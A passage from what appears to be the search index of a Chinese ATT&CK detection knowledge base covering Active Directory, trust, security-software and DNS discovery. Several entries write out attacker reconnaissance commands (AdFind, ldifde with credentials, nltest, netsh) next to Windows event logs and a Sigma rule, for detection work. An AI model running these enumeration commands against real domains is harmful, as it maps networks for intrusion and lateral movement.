%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_13","title":"\u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b","text":"<pre><code>\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a\nldifde -s 192.168.1.1 -a test\\admin Password -f all.txt\n</code></pre> <p>\u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x03-adfind","title":"0x03 \u4f7f\u7528AdFind\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.joeware.net/freetools/tools/adfind/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_14","title":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b","text":"<pre><code>\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a\nadfind.exe -h 127.0.0.1&gt;all.tx\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a\nadfind.exe -h 127.0.0.1 -f objectcategory=person&gt;user.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a\nadfind.exe -h 127.0.0.1 -f objectcategory=computer&gt;machine.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a\nadfind.exe -h 127.0.0.1 -f objectcategory=group&gt;group.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a\nadfind.exe -h 127.0.0.1 -f \"(&amp;(objectCategory=group)(name=Domain Admins))\"&gt;admin.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a\nadfind.exe -h 127.0.0.1 -f objectcategory=organizationalUnit&gt;ou.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a\nadfind.exe -h 127.0.0.1 -f objectcategory=person SamAccountName&gt;username.txt\n\n\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a\nadfind.exe -h 127.0.0.1 -f objectcategory=computer name&gt;machinename.txt\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_15","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c","text":"<pre><code>C:\\Users\\12306br0\\Desktop\\AdFind&gt;AdFind.exe -h 127.0.0.1&gt;all.txt\n\nAdFind V01.52.00cpp Joe Richards (support@joeware.net) January 2020\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_16","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c","text":"<pre><code>#windows\u5b89\u5168\u65e5\u5fd7\u8fdb\u7a0b\u521b\u5efa4688\uff0cWindows server 2016\u6d4b\u8bd5\u6548\u679c\n\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x36D7FD\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x10a4\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Users\\12306br0\\Desktop\\AdFind\\AdFind.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x69c\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: AdFind.exe  -h 127.0.0.1\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_17","title":"\u5efa\u8bae","text":"<p>\u5907\u6ce8\uff1a\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u68c0\u6d4b\u8be5\u5f02\u5e38\u884c\u4e3a\uff0c\u91cd\u70b9\u53ef\u5173\u6ce8Windows\u5b89\u5168\u65e5\u5fd7\u4e2d\u76844688\u30015158\u30015156\u30014689\u4e8b\u4ef6\uff0c\u5176\u4e2d\u8fdb\u7a0b\u4fe1\u606f\u3001\u76ee\u6807\u7aef\u53e3\uff08389\uff09\u53ef\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_18","title":"\u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b","text":"<pre><code>\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a\n\nadfind.exe -h 192.168.1.1 -u test\\admin -up Password&gt;all.txt\n</code></pre> <p>\u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x04-nltest","title":"0x04 \u4f7f\u7528Nltest\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f","text":"<p>\u8bf4\u660e\u6587\u6863\uff1a</p> <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731935(v=ws.11)</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_19","title":"\u4f7f\u7528\u8bed\u6cd5","text":"<pre><code>nltest [/\u57df\u63a7\u670d\u52a1\u5668\uff1a &lt;servername&gt;] [&lt;operation&gt; [&lt;parameter&gt;]\n\n/server\uff1a&lt;ServerName&gt;\u5728\u60a8\u6307\u5b9a\u7684\u8fdc\u7a0b\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884cnltest\u3002\u5982\u679c\u672a\u6307\u5b9a\u6b64\u53c2\u6570\uff0c\u5219nltest\u5728\u672c\u5730\u8ba1\u7b97\u673a\uff08\u5373\u57df\u63a7\u5236\u5668\uff09\u4e0a\u8fd0\u884c\u3002\n</code></pre> <pre><code>\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b\n\n\u663e\u793a\u57df\u7684\u4fe1\u4efb\u5173\u7cfb\u4e0b\u9762\u7684\u793a\u4f8b\u5217\u51fa\u4e86\u4e3a\u60a8\u7684\u57df\u5efa\u7acb\u7684\u4fe1\u4efb\u5173\u7cfb\u3002\nnltest /domain_trusts\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_20","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c","text":"<pre><code>PS C:\\Users\\wangxin&gt; nltest /domain_trusts\n\u57df\u4fe1\u4efb\u7684\u5217\u8868:\n    0: 361A 361a.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)\n\u6b64\u547d\u4ee4\u6210\u529f\u5b8c\u6210\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_21","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c","text":"<pre><code>#Windows\u5b89\u5168\u65e5\u5fd7\uff0c4688\u8fdb\u7a0b\u521b\u5efa\uff0cwindows server 2008\n\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\wangxin\n \u5e10\u6237\u540d:  wangxin\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x23cb8\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID: 0xa08\n \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\nltest.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeDefault (1)\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x9e8\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_22","title":"\u5efa\u8bae","text":"<p>\u5907\u6ce8\uff1a\u5efa\u8bae\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u4e2d\u7684\u8fdb\u7a0b\u4fe1\u606f\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_23","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1482</p> <p>https://attack.mitre.org/techniques/T1482/</p> <p>\u6e17\u900f\u57fa\u7840\u2014\u2014\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u7684\u83b7\u53d62:Bypass AV</p> <p>https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%962_Bypass-AV</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/","title":"T1518-001-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u5b89\u88c5\u5728\u7cfb\u7edf\u6216\u4e91\u73af\u5883\u4e2d\u7684\u5b89\u5168\u8f6f\u4ef6\uff0c\u914d\u7f6e\uff0c\u9632\u5fa1\u5de5\u5177\u548c\u4f20\u611f\u5668\u7684\u5217\u8868\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u8bf8\u5982\u9632\u706b\u5899\u89c4\u5219\u548c\u9632\u75c5\u6bd2\u4e4b\u7c7b\u7684\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u3002</p> <p>\u53ef\u7528\u4e8e\u83b7\u5f97\u5b89\u5168\u8f6f\u4ef6\u7684\u4fe1\u606f\u4f8b\u5982\u547d\u4ee4\u7684netsh\uff0creg query\u4e0e\u6ce8\u518c\uff0cdir\u4e0eCMD\uff0c\u548c\u4efb\u52a1\u5217\u8868\uff0c\u4f46\u53d1\u73b0\u884c\u4e3a\u5176\u4ed6\u6307\u6807\u53ef\u4ee5\u662f\u66f4\u5177\u4f53\u7684\u8f6f\u4ef6\u6216\u5b89\u5168\u7cfb\u7edf\u7684\u653b\u51fb\u8005\u6b63\u5728\u5bfb\u627e\u7684\u7c7b\u578b\u3002\u770b\u5230macOS\u6076\u610f\u8f6f\u4ef6\u5bf9LittleSnitch\u548cKnockKnock\u8f6f\u4ef6\u6267\u884c\u68c0\u67e5\u5df2\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6839\u636eATT&amp;CK\u5bf9T1063\u7684\u63cf\u8ff0\u4ee5\u53ca\u53c2\u8003\u5b9e\u4f8b\u3002\u6d4b\u8bd5\u5b9e\u4f8b\u201cNaikon\u4f7f\u7528\u547d\u4ee4netsh advfirewall firewall\u6765\u53d1\u73b0\u672c\u5730\u9632\u706b\u5899\u8bbe\u7f6e\u201d\uff0c\u6a21\u62df\u672c\u5730\u6267\u884c\u201cnetsh advfirewall firewall show rule name=all\u201d\u6765\u67e5\u770b\u672c\u5730\u9632\u706b\u5899\u89c4\u5219\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>Microsoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Users\\Administrator&gt;netsh advfirewall firewall show rule name=all\n\n\u89c4\u5219\u540d\u79f0:                             \u7f51\u7edc\u53d1\u73b0(UPnP-In)\n----------------------------------------------------------------------\n\u5df2\u542f\u7528:                               \u662f\n\u65b9\u5411:                                 \u5165\n\u914d\u7f6e\u6587\u4ef6:                             \u4e13\u7528\n\u5206\u7ec4:                                 \u7f51\u7edc\u53d1\u73b0\n\u672c\u5730 IP:                              \u4efb\u4f55\n\u8fdc\u7a0b IP:                              \u4efb\u4f55\n\u534f\u8bae:                                 TCP\n\u672c\u5730\u7aef\u53e3:     \u3000                      2869\n\u8fdc\u7a0b\u7aef\u53e3: \u3000     \u3000                   \u4efb\u4f55\n\u8fb9\u7f18\u904d\u5386:                             \u5426\n\u64cd\u4f5c:                                 \u5141\u8bb8\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09 </p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows\u672c\u5730\u6267\u884cnetsh advfirewall firewall show rule name=all\ndescription: windows server 2016\nreferences: \u6682\u65e0\ntags: T1518-001\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Newprocessname: 'C:\\Windows\\System32\\netsh.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: netsh  advfirewall firewall show rule name=all  #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u5728\u9ad8\u7248\u672c\u7684Windows\u7cfb\u7edf\u4e2d\uff0c\u5b89\u5168\u8fd0\u8425\u4eba\u5458\u53ef\u6839\u636eWindows\u7248\u672c\u53ca\u5ba1\u6838\u9700\u8981\uff0c\u5f00\u542f\u7279\u5b9a\u7684windows\u5ba1\u6838\u7b56\u7565\u3002Windows\u9ad8\u672c\u7248\u5ba1\u6838\u7b56\u7565\u5f00\u542f\u540e\uff0c\u9ed8\u8ba4\u8bb0\u5f55\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u56e0\u6b64\u5728\u9ad8\u7248\u672c\u4e2d\uff0c\u53ef\u9488\u5bf9\u53c2\u6570\u547d\u4ee4\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002\u540c\u6837\uff0cmimikatz.exe\u4e5f\u53ef\u4ee5\u6839\u636emimikatz\u7279\u5b9a\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002</p> <p>\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1518-001</p> <p>https://attack.mitre.org/techniques/T1518/001</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/","title":"T1518-win-\u8f6f\u4ef6\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u7cfb\u7edf\u4e0a\u5b89\u88c5\u7684\u975e\u5b89\u5168\u76f8\u5173\u8f6f\u4ef6\u7684\u5217\u8868\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u8f6f\u4ef6\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5236\u5b9a\u540e\u7eed\u884c\u4e3a\u8ba1\u5212\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0\uff0c\u6839\u636eMITRE ATT&amp;CK\u77e9\u9635\u56fe\u4ecb\u7ecd\uff0c\u4f7f\u7528\u6b64\u6280\u6218\u672f\u7684\u7ec4\u7ec7\u8f83\u5c11\uff0c\u6545\u4e0d\u4f5c\u8be6\u7ec6\u6d4b\u8bd5\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1518</p> <p>https://attack.mitre.org/techniques/T1518/</p> <p>MITRE-ATT&amp;CK-T1057</p> <p>https://attack.mitre.org/techniques/T1057/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/","title":"T1590-win-DNS\u8bb0\u5f55\u83b7\u53d6","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u653b\u51fb\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005DNS\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u5728\u76ee\u6807\u786e\u5b9a\u671f\u95f4\u4f7f\u7528\u3002</p> <p>\u5728\u57df\u6e17\u900f\u4e2d\uff0c\u5bf9\u57df\u73af\u5883\u7684\u4fe1\u606f\u641c\u96c6\u5f88\u5173\u952e\uff0c\u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u5185\u7ba1\u7406\u5458\u7684\u6743\u9650\uff0c\u90a3\u4e48\u5982\u4f55\u80fd\u591f\u5feb\u901f\u4e86\u89e3\u57df\u5185\u7684\u7f51\u7edc\u67b6\u6784\u5462\uff1fDNS\u8bb0\u5f55\u65e0\u7591\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u53c2\u8003\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u672c\u6587\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u901a\u8fc7dnscmd\u83b7\u53d6DNS\u8bb0\u5f55</li> </ul> <p>dnscmd\uff1a\u7528\u6765\u7ba1\u7406DNS\u670d\u52a1\u5668\u7684\u547d\u4ee4\u884c\u63a5\u53e3\uff0c\u652f\u6301\u8fdc\u7a0b\u8fde\u63a5</p> 